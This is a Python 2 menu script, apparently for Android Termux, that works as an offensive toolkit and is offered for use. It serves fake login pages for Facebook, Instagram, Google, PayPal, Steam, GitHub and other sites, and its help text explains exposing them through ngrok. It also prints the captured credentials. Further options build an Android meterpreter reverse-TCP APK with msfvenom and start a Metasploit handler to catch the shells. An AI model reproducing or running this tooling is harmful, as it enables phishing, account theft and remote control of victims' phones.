#!/bin/env python2
#
import os
from time import time, ctime
import sys

sys.path.append("/data/data/com.termux/files/home/server/modules")
import gatherinfo

def clear():
	os.system("clear")
	print ''
#	z = raw_input("Press Enter to continue ..")
def ip():
	os.system("ifconfig")
	print ''
	z = raw_input("Press Enter to continue ..")
def guide():
	help = '''
 
 1. How to create localhost..?
 
 open termux and type [server]
 and select option 1 
 
 Enter port for example 4444,8080 etc and select your 
 webpage path
 example :-
        Enter port :- 8080 
	Enter file path :- /sdcard/yourfile
 press ctrl + c for close
 
 2. How to create phishing server ..?
 
 type [server] in termux and select option 3
 this shows some fake pages like facebook, instagram etc
 and select whatever you want by selecting number
 like 1 , 2 ,3 .. 99 for exit and it asks port , fill it 
 and press enter and open new session type [server] and 
 if you dont have ngrok and select option 5, after this 
 process again open new session and type 
 example :-
	./ngrok http 8080 this is for port forwarding
 
 3. How to check login credentials ..?

 type [server] in termux and select option 4

 Extra commands:
 
 Description                   options

 help                          -h/help
 ifconfig                      ifconfig
 clear screen                  clear
'''
 	print help
	print ''
	z = raw_input("Press Enter to continue ..")
	print ''

def amma():
 x = ""
 tt= ""
 while x != "99":
  try:
#	os.system("clear")
 	os.system("sh modules/banner.sh")
 	logo = '''
              \033[1;39m    ============================
	          |       PHP SERVER         |
	          |    IN ANDROID TERMUX     |
	          |  [+]  coded by sachin    |
	          ============================
 \033[1;32m............................................................\033[1;39m
 '''
 	print logo
 	past = ctime(time())
 	if tt != past:
 		print "       Log time is ",ctime(time())
		tt = past
 	logo1 = ''' 

      1-Localhost        5-Download ngrok  9-IP_tools
      2-Webhost          6-Serveo.net
      3-Phishing server  7-Create payload
      4-Check Logs       8-metasploit
	
      99-exit
 \033[1;32m............................................................
 '''
 	print logo1
	red = "\033[1;31m"
	print red
	x = raw_input("[+] Select >> \033[1;39m ")
	if x == "1":
		os.system("clear")
		os.system("sh .localhost.sh")
	elif x=="2":
		os.system("clear")
		os.system("sh .webhost.sh")
	elif x == "3":
		while 1:
		  try:
#			os.system("clear")
			os.system("clear")
			print "\033[1;39m"
		#	os.system("figlet +Phishing+")
		#	print '\033[1;39m    ============================='
			os.system("sh modules/banner.sh")
			suchetha = '''
	       ------===PHISHING SQUAD===------
			
			'''
			print suchetha
			print "\033[1;39m          1 - Facebook page      7 - stackoverflow"
			print "          2 - Instagram page     8 - twitter"
			print "          3 - google             9 - wordpress"
			print "          4 - steam             "
			print "          5 - paypal"
			print "          6 - github"
			print ""
			print "          99 - back menue"
		#	print "    ============================="
			print "\033[1;36m"
			y = raw_input("\033[1;31m[+] Select >> \033[1;39m ")
			if y == "1":
				os.system("sh .facebook.sh")
			elif y == "2":
				os.system("sh .instagram.sh")
			elif y == "3":
				port = raw_input("Enter port :- ")
				os.system("php -S localhost:"+port+" -t /data/data/com.termux/files/home/server/files/gmail")
			elif y == "4":
				port = raw_input("Enter port :- ")
				os.system("php -S localhost:"+port+" -t /data/data/com.termux/files/home/server/files/steam")
			elif y == "5":
				port = raw_input("Enter port :- ")
				os.system("php -S localhost:"+port+" -t /data/data/com.termux/files/home/server/files/paypal")
			elif y == "6":
				port = raw_input("Enter port :- ")
				os.system("php -S localhost:"+port+" -t /data/data/com.termux/files/home/server/files/github")
			elif y == "7":
				port = raw_input("Enter port :- ")
				os.system("php -S localhost:"+port+" -t /data/data/com.termux/files/home/server/files/stackoverflow")
			elif y == "8":
				port = raw_input("Enter port :- ")
				os.system("php -S localhost:"+port+" -t /data/data/com.termux/files/home/server/files/twitter")
			elif y == "9":
				port = raw_input("Enter port :- ")
				os.system("php -S localhost:"+port+" -t /data/data/com.termux/files/home/server/files/wordpress")
			elif y== "99":
				break
			elif y=="-h":
				guide()
			elif y=="help":
				guide()
			elif y=="clear":
				clear()
			elif y=="ifconfig":
				ip()
			else:
				print "[x] Invalid option "
				print ''
				v = raw_input("Press enter to continue ..") 
		  except KeyboardInterrupt:
			print ""
			print "Exiting ...."
			os.system("sleep 2")
	elif x == "4":
		while 1:
			os.system("clear")
			os.system("sh modules/banner.sh")
			login = '''
	      ------===Login Credentials===------
			'''
			print login
		#	print "===================="
			print "\033[1;39m          1 - facebook log      7 - stackoverflow log"
			print "          2 - instagram log     8 - twitter log"
			print '          3 - gmail or google   9 - wordpress log'
			print "          4 - steam log"
			print "          5 - paypal log"
			print "          6 - github log"
			print ''
			print "          99 - menue "
			print ''
			z = raw_input("\033[1;31m[+] Select >> \033[1;39m ")
			print ''
			if z =="1":
				os.system("cat /sdcard/hacking_server/facebook/php/file.txt")
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="2":
				os.system("cat /sdcard/hacking_server/instagram/logs.txt")
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="3":
				os.system("cat /data/data/com.termux/files/home/server/files/gmail/file.txt")
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="4":
				os.system("cat /data/data/com.termux/files/home/server/files/steam/file.txt")
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="5":
				os.system("cat /data/data/com.termux/files/home/server/files/paypal/file.txt")
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="6":
				os.system("cat /data/data/com.termux/files/home/server/files/github/file.txt")
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="7":
				os.system("cat /data/data/com.termux/files/home/server/files/stackoverflow/file.txt")
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="8":
				os.system("cat /data/data/com.termux/files/home/server/files/twitter/file.txt")
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z =="9":
				os.system("cat /data/data/com.termux/files/home/server/files/wordpress/file.txt")
				print ''
				q = raw_input("Press Enter to continue ... ")
			elif z == "99":
				break
			elif z == "-h":
				guide()
			elif z == "help":
				guide()
			elif z == "clear":
				clear()
			elif z == "ifconfig":
				ip()
			else:
				print "[x] invalid option"
				print "Type -h/help for guide"
				print ''
				q = raw_input("Press Enter to continue ... ")
	elif x == "5":
		os.system("sh ngrok/ng.sh")
	elif x == "6":
		os.system("clear")
		os.system("python2 ngrok/serveo.py")
	elif x == "7":
		while 1:
			os.system("clear")
			os.system("sh modules/banner.sh")
			ammamma = '''
	       ------===Create Payload===------
			'''
			print ammamma
			print '\033[1;39m'
			print "         1 - Create Payload"
			print ""
			print "         99- main menu"
			print ''
			c = raw_input("\033[1;31m[+] Select >> \033[1;39m ")
			if c =="clear":
				clear()
			elif c =="ifconfig":
				ip()
			elif c =="-h":
				guide()
			elif c =="1":
				lhost = raw_input("Enter LHOST : ")
				lport = raw_input("Enter LPORT : ")
				name = raw_input("Give payload name : ")
				os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" R> /data/data/com.termux/files/home/server/meta/"+name+".apk")
				print ''
				print "Check your payload in /meta folder"
				print ''
				cc = raw_input("press Enter to continue ...")
			elif c =="help":
				guide()
			elif c =="99":
				break
			else:
				print "[x] invalid option"
				print "Type -h/help for guide"
				print ''
				q = raw_input("Press Enter to continue ... ")
	elif x == "8":
		print ""
		os.system("rm -rf meta/file.rc")
		out_file = open("file.rc", "w")
		port = raw_input("Enter port :- ")
		lhost = raw_input("Enter lhost :- ")
		out_file.write("use exploit/multi/handler"+"\n"+"set payload android/meterpreter/reverse_tcp"+"\n"+"set lhost "+lhost+"\n"+"set lport "+port+"\n"+"exploit")
		out_file.close()
		os.system("mv file.rc meta")
		os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
		os.system("msfconsole -r meta/file.rc")
	elif x == "9":
		os.system("rm -rf modules/gatherinfo.pyc")
		os.system("sh modules/banner.sh")
		sachin ='''
	         ------===IP tools ===------
		'''
		print sachin
		gatherinfo.bbsad()
		os.system("rm -rf modules/gatherinfo.pyc")
	elif x == "":
		print ""
		print "Why , plz give input .."
		print "Type -h/help for guide"
		print ''
		q = raw_input("Press Enter to continue ... ")
	elif x == "99":
		print ''
		print "Bye Bye "
		print ''
	elif x == "-h":
		guide()
	elif x == "help":
		guide()
	elif x == "clear":
		clear()
	elif x == "ifconfig":
		ip()
	else:
		print ""
		print "[x] invalid option"
		print "Type -h/help for guide"
		print ''
		z = raw_input("Press enter to continue ..")
#	elif x == "99":
#		os.system("clear")
#		break
  except:
	print ""
	print "exiting ....."
	os.system("sleep 1")
amma()
